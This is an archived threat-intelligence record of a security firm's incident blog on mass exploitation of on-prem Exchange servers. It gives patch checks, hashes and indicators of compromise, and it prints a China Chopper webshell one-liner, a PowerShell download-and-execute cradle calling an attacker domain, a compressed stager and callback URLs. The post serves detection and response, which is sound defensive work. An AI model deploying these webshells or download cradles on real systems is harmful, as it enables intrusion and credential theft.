{
    "id": "f8d3a6e0-4548-444d-98ef-b7eccb8e502c",
    "created_at": "2023-01-12T15:01:05.331591Z",
    "updated_at": "2025-03-27T02:12:03.896741Z",
    "deleted_at": null,
    "sha1_hash": "61ac64b4f920a0cf947080deb07e68b08ce3d3e2",
    "title": "2021-03-03 - Rapid Response- Mass Exploitation of On-Prem Exchange Servers",
    "authors": "",
    "file_creation_date": "2022-05-28T02:24:40Z",
    "file_modification_date": "2022-05-28T02:24:40Z",
    "file_size": 2064031,
    "plain_text": "# Rapid Response: Mass Exploitation of On-Prem Exchange Servers\n\n**[huntress.com/blog/rapid-response-mass-exploitation-of-on-prem-exchange-servers](https://www.huntress.com/blog/rapid-response-mass-exploitation-of-on-prem-exchange-servers)**\n\n**UPDATED 14 April:**\n\n**Huntress is aware of the new Microsoft Exchange vulnerabilities disclosed in the** **Microsoft April Security**\n**Update. Our team has yet to detect exploits targeting these new vulnerabilities on any hosts running the**\n**Huntress agent but will continue to closely monitor for these threats. These vulnerabilities are all branded as**\n**\"critical\" in severity and again offer remote code execution to an attacker. Considering the strong focus on**\n**Exchange by a large number of threat actors, it is absolutely imperative that organizations patch as quickly as**\n**they can. We recommend you** **[update to the latest security patch, monitor for new indicators of compromise and](https://aka.ms/ExchangeUpdateWizard)**\n**stay up-to-date on new information as it releases. We will continue to update this post with new findings.**\n\n**UPDATED 05 March @ 1347pm ET: Added instructions on verifying patch status and new IOCs.**\n\nUPDATED 05 March @ 1904pm ET: Added PowerShell syntax to verify patch status.\n\nUPDATED 06 March @ 0004am ET: Added official Microsoft NSE script and new post-exploitation.\n\nUPDATED 06 March @ 0317am ET: Added analysis leading to \"stage 6\": Cobalt Strike & Mimikatz.\n\nOn March 1, our team was notified about undisclosed Microsoft Exchange vulnerabilities successfully exploiting on-prem\nservers. After the tip from one of our MSP partners, we confirmed the activity and Microsoft has since released an initial\nblog and [emergency patches for the vulnerabilities.](https://msrc-blog.microsoft.com/2021/03/02/multiple-security-updates-released-for-exchange-server/)\n\nThe purpose of this blog post is to spread the word that this is being actively exploited in the wild. At the moment, we’ve\ndiscovered 350+ webshells across roughly 2,000 3,000 vulnerable servers (majority have AV/EDR installed) and we\nexpect this number to keep rising.\n\n**UPDATE 05 March 1347pm ET:** **Currently we have visibility on roughly 3,000 Exchange servers. We see ~800**\n**remain unpatched without the hotfix for an up-to-date CU version number.**\n\nWe will continue to update this blog with our observations and IOCs to drive awareness. You can also check out our\n[reddit thread to stay up to date.](https://www.reddit.com/r/msp/comments/lwmo5c/mass_exploitation_of_onprem_exchange_servers/)\n\n\n-----\n\n**Want more in depth info on these vulnerabilities?** **[Watch our on demand webinar or](https://www.huntress.com/resources/webinar/microsoft-exchange-exploitation)** **[download the slides to](https://www.huntress.com/resources/ebook/exchange-server-exploitation)**\n**hear about our research, new IOCs and more.**\n\n## What’s Happening?\n\nAccording to Microsoft’s initial blog, they detected multiple zero-day exploits being used to plunder on-premises versions\nof Microsoft Exchange Server in what they claim are “limited and targeted attacks.” They also highlight that threat actor\n\"HAFNIUM primarily targets entities in the United States across a number of industry sectors, including infectious disease\nresearchers, law firms, higher education institutions, defense contractors, policy think tanks, and NGOs.\"\n\n**This seems to be much a larger spread than just \"limited and targeted attacks\" as Microsoft has suggested.**\nFrom our research, we've checked over 2,000 3,000 Exchange servers and see ~800 remain unpatched, identifying over\n300 of our partners’ servers that have received webshell payloads.\n\nThese companies do not perfectly align with Microsoft's guidance as some personas are small hotels, an ice cream\ncompany, a kitchen appliance manufacture, multiple senior citizen communities and other \"less than sexy\" mid-market\nbusinesses. We’ve also witnessed many city and county government victims, healthcare providers, banks/financial\ninstitutions, and several residential electricity providers.\n\nAmong the vulnerable servers, we also found over 350 webshells—some targets may have more than one webshell,\npotentially indicating automated deployment or multiple uncoordinated actors. These endpoints do have antivirus or EDR\nsolutions installed, but this has seemingly slipped past a majority of preventative security products. And with insight from\nthe community, we’ve seen honeypots attacked—making it clear that threat actors are just scanning the internet looking\nfor low-hanging fruit.\n\nThese attacks are grave due to the fact that every organization simply has to have email, and Microsoft Exchange is so\nwidely used. These servers are typically publicly accessible on the open internet and they can be exploited remotely.\nThese vulnerabilities can be leveraged to gain remote code execution and fully compromise the target. From there, the\nattackers have a foothold in the network and can expand their access and do much more damage.\n\n## What Should MSPs Do?\n\nIf you use on-prem Microsoft Exchange Servers, you might want to assume you’ve been hit. We recommend you not only\npatch immediately, but externally validate the patch and hunt for the presence of these webshells and other indicators of\ncompromise (see the technical details below). Trusting the dashboard is simply not enough.\n\nThus far, it looks like all preventive products allowed the webshell to get dropped. Here's a small sampling of the files\nfound and which AV/EDR/SOCaaS solutions were installed.\n\n\n-----\n\n**UPDATE 05 March 1347pm ET:** **External validation of the patch via a community Nmap script does not validate**\n**via the full version and is no longer advised. The version information included in Exchange server Registry Keys**\n**also does not seem to match the full version of the active installation if it is updated. The single source of truth**\n**we have determined is the exact version number for the running Exchange service. To validate your patch,**\n**please continue reading.**\n\nUPDATE 06 March 0004am ET: An official Nmap NSE has been provided by Microsoft that can identify is your systems\nare still vulnerable and validate patching. From our tests, this has provided reliable results.\n[https://github.com/microsoft/CSS-Exchange/blob/main/Security/http-vuln-cve2021-26855.nse](https://github.com/microsoft/CSS-Exchange/blob/main/Security/http-vuln-cve2021-26855.nse)\n\nTo check your own patch status, we recommend you view the version number of the\nMicrosoft.Exchange.RpcClientAccess.Service.exe binary present in the installation path of your Exchange server. You\ncan view this by right-clicking the file in Explorer, selecting Properties, and switching to the Details tab.\n\nWhile the default installation path for Exchange is C:\\Program Files\\Microsoft\\Exchange Server\\V15\\bin, if you have a\ncustom installation path that you are unaware of, you can examine this registry key to find the current path for versions of\nExchange 2013 or greater:\n\n\n-----\n\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\ExchangeServer\\v15\\Setup\\MsiInstallPath\n\nExchange versions 2010 and below are end-of-life and should not be used in production.\n\nVerify that the full version of this Microsoft.Exchange.RpcClientAccess.Service.exe file and its SHA256 hash is present in\nthis chart below. This information comes from the official Microsoft Knowledge Base documentation per each version of\nExchange and respective CU.\n\n\n**Exchange**\n**Version**\n\nExchange\n2013\nCU23\nPatched\n\nExchange\n2016\nCU18\nPatched\n\nExchange\n2016\nCU19\nPatched\n\nExchange\n2019 CU7\nPatched\n\nExchange\n2019 CU8\nPatched\n\n\n**Hash of MSExchangeRPC Service Binary** **Version** **MS Patch**\n**Link**\n\n17a077eab538ca80155e6667735a1bc86510b08656e79fd6e931687b573042ca 15.0.1497.12 [KB5000871](https://www.microsoft.com/en-us/download/details.aspx?id=102775)\n\n92d17848f4c0fd4d7ab99842f8058ed9925179611b8b4ad2084fabb1a39badc1 15.1.2106.13 [KB5000871](https://www.microsoft.com/en-us/download/details.aspx?id=102773)\n\n18f85477f7edad2ca5686a1bc362c3ebed0ef37ba993ca61fc1fcc3249799cf2 15.1.2176.9 [KB5000871](https://www.microsoft.com/en-us/download/details.aspx?id=102772)\n\naf9fdab713ca9223719448f81cfba9018563ebef2b61e09e4e2ceb13efa6ef49 15.2.721.13 [KB5000871](https://www.microsoft.com/en-us/download/details.aspx?id=102771)\n\n4c77d11aeaf590e6316125d8cd8217b69334aa62956097628d09b46b93203c0e 15.2.792.10 [KB5000871](https://www.microsoft.com/en-us/download/details.aspx?id=102770)\n\n\n**The full value of the version number must match.**\n\n**Note: we do need to be forthcoming in that this approach is only checking the version of one file, the RPC Client**\nAccess Service, that our analysis has indicated does in fact update on fully patched hosts. This does not truly say the\npatch was 100% applied correctly, but does indicate at a minimum partial installation. It is likely if this version is correct\nand the server is functional, the patch was applied properly.\n\nThis process is not automated by Huntress. The Huntress agent alone is not a vulnerability scanning tool and cannot\ndetermine 100% patch status.\n\nWe strongly encourage you to perform this check personally, and continue to monitor the health of your Exchange\nservers by [utilities published by Microsoft or](https://github.com/microsoft/CSS-Exchange/blob/main/Security/Test-ProxyLogon.ps1) [vetted scripts contributed by the threat intelligence community.](https://github.com/dpaulson45/HealthChecker/)\n\nUPDATE 05 March @ 1904pm ET: If you consider yourself a command-line cowboy and would prefer to check the status\nof the patch via PowerShell, you can use this one-liner syntax. Simply copy-and-paste and slap it into your shell. Credit to\n[Cyberdrain.com / Kelvin Tegelaar for the base syntax.](http://cyberdrain.com/)\n$SafeVersions = \"15.2.792.10\",\"15.2.721.13\",\"15.1.2176.9\",\"15.1.2106.13\",\"15.0.1497.12\",\"14.3.513.0\"|Foreach-Object\n{[version]$_}; $Version =\n\n[System.Diagnostics.FileVersionInfo]::GetVersionInfo(\"$($ENV:ExchangeInstallPath)\\bin\\Exsetup.exe\").FileVersion; if\n($SafeVersions -notcontains $Version){ Write-Host -ForegroundColor Red \"[!] Patch not installed successfully, this server\nmust be patched.\" } else { Write-Host -ForegroundColor Green \"[+] Exchange FileVersion is updated, the patch is in\nplace.\" }\n\n\n-----\n\n## Huntress Is Here to Help\n\n**UPDATE 05 March 1347pm ET: We are automatically detecting the presence of malicious webshells and active**\nexploitation, and will send a critical report if/when those are discovered. These reports will not automatically close out and\nwill remain after you have completed patching. To close the incident report please email support@huntress.com and we\nwill manually close the report.\n\nHuntress is staying engaged with the threat intelligence and notifying as many individuals as possible as quickly as\npossible.\n\nNot only are we committed to educating you on how these vulnerabilities are being exploited, we’re also using our own\nplatform to help us identify as many infected hosts as we can.\n\nWe have had to get creative to help join the fight here. This is not something that “Huntress would normally find”,\nbecause these indicators of compromise are not persistence mechanisms. At the very start of this incident, practically all\npreventative security measures let this slip by -- however now that the news broke, many are adding this capability into\ntheir detections.\n\nOur engineering team has worked overnight to create code to generate incident reports for all of the agents where we've\ndetected infections. As of March 3rd, all of these incident reports have been sent to every organization that we were\naware had an infected host. These reports also included Assisted Remediation playbooks that will remove the “China\nChopper” ASPX webshells that we discovered.\n\nSince this is an active exploit, we’ve added Monitored Files that will look for both existing and new webshells that are\nbeing dropped.\n\nWe are communicating with partners in full transparency that this is additional support we offer to be the best stewards of\nsecurity. We have visibility on thousands of servers and have uncovered multiple new indicators of compromise, and we\nunderstand the magnitude of this incident. Despite this initially being blanketed with the description of “limited and\ntargeted” in scope, we cannot shrug this off -- and we cannot allow our partners to do so either.\n\n## Technical Details\n\nThe vulnerabilities affect on-prem Microsoft Exchange Server. Exchange Online is not affected.\n\nThe versions affected are:\n\nMicrosoft Exchange Server 2019\nMicrosoft Exchange Server 2016\nMicrosoft Exchange Server 2013\n\nMicrosoft Exchange Server 2010\n\nCVEs affiliated with this incident:\n\n[CVE-2021-26855](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-26855)\n[CVE-2021-26857](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-26857)\n[CVE-2021-26858](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-26858)\n[CVE-2021-27065](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-27065)\n\nWe are finding a significant number of webshells within the \"C:\\inetpub\\wwwroot\\aspnet_client\\system_web\" directory.\nPlease keep in mind, this location can be redirected via the \"PathWWWRoot\" value in the\n\"HKLM\\SOFTWARE\\Microsoft\\InetStp\" registry key. Webshell file names include:\n\n**UPDATE 05 March 1347pm ET: We offer 358 unique webshell filenames.**\n\n\n-----\n\n[Some webshell filenames seem to be randomly generated, while some seem to be a static string. This list includes new](https://gist.github.com/JohnHammond/0b4a45cad4f4ed3324939d72dc599883)\nwebshell names that we have not yet seen included in Microsoft’s reporting.\n\nThe webshell that these threat actors are using is known as the \"China Chopper\" one-liner. These are often in either the\nASPX or PHP web language, and will execute code passed in as an HTTP argument included in the request. The oneliner is slipped into a file and has a syntax like so:\n```\nhttp://f/<script language=\"JScript\" runat=\"server\">function Page_Load()\n{eval(Request[\"NO9BxmCXw0JE\"],\"unsafe\");}</script>\n\n```\n**UPDATE 05 March 1347pm ET: We offer 25 unique webshell HTTP request variables.**\n\nNote that the different naming conventions of these ASPX webshells indicates the use of a different request variable.\nFrom the files we have seen thus far, [we offer this breakdown also available online.](https://gist.github.com/JohnHammond/e3053768a06f1ba115c1efbd3a71103d)\n\n## Post-Exploitation Analysis\n\nUPDATE 06 March 0004am ET: These are new details just discovered.\n\nFrom a previously discovered webshell, we saw the execution of a command that was detected and stopped by Windows\nDefender.\n\nThis PowerShell payload runs the Base64 encoded command (link defanged):\n```\nIEX (New-Object Net.WebClient).downloadstring(' http[:]//p.estonine.com/p?e ')\n\n```\nThis domain is hosted on yet another Digital Ocean IP address, which we have reported.\n\n\n-----\n\n-----\n\nThe response from this domain is a PowerShell download cradle, which seems to pull down a stager. Downloading the\ncontents from this URL, we see:\n```\nInvoke-Expression $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object\nIO.MemoryStream\n(,$([Convert]::FromBase64String('7b0HYBxJliUmL23Ke39K9UrX4HShCIBgEyTYkEAQ7MGIzeaS7B1pRyMpqyqBymVWZV1mFkDM7Z28995\n [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd();\n\n```\nThis syntax loads more PowerShell code into memory, after decoding Base64 and decompressing it. The next layer\nincludes this content:\n\nThis code looks to gather data on the specific target and uses that to request more additional code from external servers.\nIt sets up persistence via scheduled tasks depending on the amount of privileges and integrity level, and looks to execute\nanother obfuscated payload every 45 minutes. These payloads pull from http[:]//cdn.chatcdn.net/p?low210305 or\nhttp[:]//cdn.chatcdn.net/p?hig210305 based on high or medium integrity.\n\nInterestingly enough, both of these payloads are the same.\n```\nInvoke-Expression $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object\nIO.MemoryStream\n(,$([Convert]::FromBase64String('7b0HYBxJliUmL23Ke39K9UrX4HShCIBgEyTYkEAQ7MGIzeaS7B1pRyMpqyqBymVWZV1mFkDM7Z28995\n [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd();\n\n```\nThe final download we see calls out to http[:]//188.166.162.201/update.png, passing along the information gathered from\nthis host. Requesting that URL with fake analysis data, we see a hefty 2 MB response which can yet again be decoded.\n[For brevity we will not include that payload in this post but link to it here.](https://gist.github.com/JohnHammond/349de807b96db1d0292d3d20e4ff6453)\n\n[The decoded payload is a whopping 6 MB. For your own analysis, you can find that latest payload here.](https://gist.github.com/JohnHammond/6930c8e5d7c233ddb86f5631ff5ba7a6)\n\n\n-----\n\nAs of 06 March 0100am ET, we see the presence of this Winnet persistent service on 5 compromised Exchange servers.\nWe can expect this number to increase and will be monitoring closely... this \"more traditional\" persistence method is what\nHuntress is fine-tuned to catch. ;)\n\nThe traces of PowerShell we uncovered previously seem to be already known from previous research:\n[https://vulners.com/carbonblack/CARBONBLACK:6730D6EB8DF875C002A93DBC78C80B9D](https://vulners.com/carbonblack/CARBONBLACK:6730D6EB8DF875C002A93DBC78C80B9D)\n\nUPDATE 06 March 0216am ET: We have worked through another layer of the onion. That 6 MB PowerShell payload\nuses a humongous multiline format-string to reorder and rearrange the entirety of the file, and pipe it into IEX or InvokeExpression. It uses the typical $env:COMSPEC indexing technique to \"spell out\" the IEX alias. Removing the IEX we can\nlet it unravel itself and reveal the next stage.\n\n[What we are calling \"stage five\" (jeez) you can find here on this public Gist.](https://gist.github.com/JohnHammond/d4dba6b272bcae62d8946a0eb9af9220)\n\nSome techniques are immediately noticeable. The use of sporadic ` backticks in a PowerShell command to \"escape\"\ncharacters helps separate strings. There is clear use of inline C# and compiling code with the Add-Type cmdlet, gaining\naccess to Win32 API calls, and more.\n\nUPDATE 0317am ET: Inside the \"stage five\" PowerShell code, we see two Base64 binaries. Extracting these out, we\nreach \"stage six\" and uncover DLL files. These are not .NET assemblies and we cannot easily open them up in dnSpy or\nILSpy, and we're left to tools like GHIDRA/IDA/Hopper.\n\nThere are breadcrumbs that indicate the use of SQLite, Mimikatz, dumping Google Chrome credentials and more. From\nthe stage 5 code, we can see that it does load these DLLs and invoke portions to literally run\n\"powershell_reflective_mimikatz\".\n\n\n-----\n\nWe believe that these are both the 32-bit and 64-bit renditions of Mimikatz.\n\nWhile we are still digging through these to find more definitive details, simply passing these into a scanner like VirusTotal\nor ReversingLabs makes these binaries light up like a Christmas tree.\n\n\n-----\n\n_*We will continue to update this post as more information flows in._\n\n**John Hammond**\n\nThreat hunter. Education enthusiast. Senior Security Researcher at Huntress.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-03-03 - Rapid Response- Mass Exploitation of On-Prem Exchange Servers.pdf"
    ],
    "report_names": [
        "2021-03-03 - Rapid Response- Mass Exploitation of On-Prem Exchange Servers.pdf"
    ],
    "threat_actors": [
        {
            "id": "529c1ae9-4579-4245-86a6-20f4563a695d",
            "created_at": "2022-10-25T16:07:23.702006Z",
            "updated_at": "2025-03-27T02:02:09.93109Z",
            "deleted_at": null,
            "main_name": "Hafnium",
            "aliases": [
                "Red Dev 13",
                "Silk Typhoon"
            ],
            "source_name": "ETDA:Hafnium",
            "tools": [],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "610a7295-3139-4f34-8cec-b3da40add480",
            "created_at": "2023-01-06T13:46:38.608142Z",
            "updated_at": "2025-03-27T02:00:02.87217Z",
            "deleted_at": null,
            "main_name": "Cobalt",
            "aliases": [
                "Cobalt Gang",
                "GOLD KINGSWOOD",
                "COBALT SPIDER",
                "G0080",
                "Mule Libra",
                "Cobalt Group"
            ],
            "source_name": "MISPGALAXY:Cobalt",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "aa73cd6a-868c-4ae4-a5b2-7cb2c5ad1e9d",
            "created_at": "2022-10-25T16:07:24.139848Z",
            "updated_at": "2025-03-27T02:02:10.120505Z",
            "deleted_at": null,
            "main_name": "Safe",
            "aliases": [],
            "source_name": "ETDA:Safe",
            "tools": [
                "DebugView",
                "LZ77",
                "OpenDoc",
                "SafeDisk",
                "TypeConfig",
                "UPXShell",
                "UsbDoc",
                "UsbExe"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "7c969685-459b-4c93-a788-74108eab6f47",
            "created_at": "2023-01-06T13:46:39.189751Z",
            "updated_at": "2025-03-27T02:00:03.017103Z",
            "deleted_at": null,
            "main_name": "HAFNIUM",
            "aliases": [
                "ATK233",
                "G0125",
                "Operation Exchange Marauder",
                "Red Dev 13",
                "Silk Typhoon"
            ],
            "source_name": "MISPGALAXY:HAFNIUM",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "2704d770-43b4-4bc4-8a5a-05df87416848",
            "created_at": "2022-10-25T15:50:23.306305Z",
            "updated_at": "2025-03-27T02:00:55.43633Z",
            "deleted_at": null,
            "main_name": "HAFNIUM",
            "aliases": [
                "HAFNIUM",
                "Operation Exchange Marauder",
                "Silk Typhoon"
            ],
            "source_name": "MITRE:HAFNIUM",
            "tools": [
                "Tarrask",
                "ASPXSpy",
                "Impacket",
                "PsExec",
                "China Chopper"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1673535665,
    "ts_updated_at": 1743041523,
    "ts_creation_date": 1653704680,
    "ts_modification_date": 1653704680,
    "files": {
        "pdf": "https://archive.orkl.eu/61ac64b4f920a0cf947080deb07e68b08ce3d3e2.pdf",
        "text": "https://archive.orkl.eu/61ac64b4f920a0cf947080deb07e68b08ce3d3e2.txt",
        "img": "https://archive.orkl.eu/61ac64b4f920a0cf947080deb07e68b08ce3d3e2.jpg"
    }
}